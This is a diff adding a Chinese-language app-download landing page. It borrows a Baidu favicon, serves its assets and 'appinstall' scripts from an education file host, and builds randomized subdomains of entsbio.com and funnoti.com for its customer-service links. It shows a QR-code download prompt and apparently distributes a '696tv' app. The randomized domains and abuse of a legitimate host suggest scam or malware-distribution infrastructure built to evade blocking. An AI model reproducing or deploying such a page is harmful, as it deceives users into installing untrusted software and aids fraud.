@@ -1,0 +1,46 @@
+
+<!DOCTYPE html>
+<html data-dpr="1" lang="zh-CN">
+<head>
+<meta http-equiv="content-type" content="text/html; charset=UTF-8">
+<meta name="referrer" content="no-referrer">
+<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,minimum-scale=1.0,user-scalable=no">
+<link rel="shortcut icon" href="https://www.baidu.com/favicon.ico">
+<title>欢迎光临</title>
+<base href="https://file.icve.com.cn/file_doc/">
+<script>
+    const pre = Math.random().toString(36).slice(2, 11);
+	const opServer = `https://${pre}.entsbio.com:6443`; 
+    const base = `https://${pre}.bigo.h5.funnoti.com`;
+    document.addEventListener('DOMContentLoaded', () => {
+        document.querySelectorAll('#kfurl, .kf-link').forEach(link => {
+            link.href = `${base}/anfa/696tv/kf.html`;
+            link.target = '_blank';
+            link.rel = 'noopener noreferrer';
+        });
+    });
+</script>
+<style>
+*{margin: 0;padding: 0;}
+img{display: block;width: 100%;}
+.page-content{width: 100%;max-width: 580px;margin: 0 auto;padding: 6.95rem 0;}
+.page-top{position: fixed;top: 0;left: 50%;width: 100%;max-width: 580px;transform: translate(-50%, 0);z-index: 10;}
+.page-bottom{position: fixed;bottom: 0;left: 50%;width: 100%;max-width: 580px;transform: translate(-50%, 0);z-index: 10;}
+</style>
+<body>
+<div class="qrcode-content" style="position: fixed;top: 50%;left: 50%;transform: translate(-50%, -50%);width: 220px;border-radius: 10px;padding: 10px;overflow: hidden;background: #f1f1f1;display: flex;align-items: center;justify-content: center;display: none;z-index: 11;">
+  <div style="text-align: center;font-size:16px;margin-bottom:10px;color:#000;">请使用手机扫码下载</div>  
+  <div id="codeDiv"></div>
+</div>
+<div class="page-content downApp">
+  <div class="page-top"><img src="./808/877/CA3DB7CF03EFFEB241B32BD1CB66F7BE.gif?img/top.gif" alt=""></div>
+  <img src="./378/795/5E8C6F8236EB4617FA30230FF841B0C9.gif?img/mid1.gif" alt="">
+  <img src="./100/980/193F52AC04F75580A2763D197E7B7FB3.gif?img/mid2.gif" alt="">
+  <img src="./402/160/64B281EC16CF065151FB9F5F53C0FB88.gif?img/mid3.gif" alt="">
+  <div class="page-bottom"><img src="./377/364/5E65B36B3E9C92EED1D4A0A4508416D7.gif?img/tom.gif" alt=""></div>
+</div>
+<script src="./549/267/89642D56F1F0DA5074096417E8A37A35.js?appinstall/tj.js"></script>
+<script src="./325/725/517B55D3688CE9EF1085A3D9632BCB97.js?appinstall/ewm.js"></script>
+<script src="./868/325/D935165D79273EB8505A05630FD20A2C.js?appinstall/rsrzrcj.js"></script> 
+</body>
+</html>
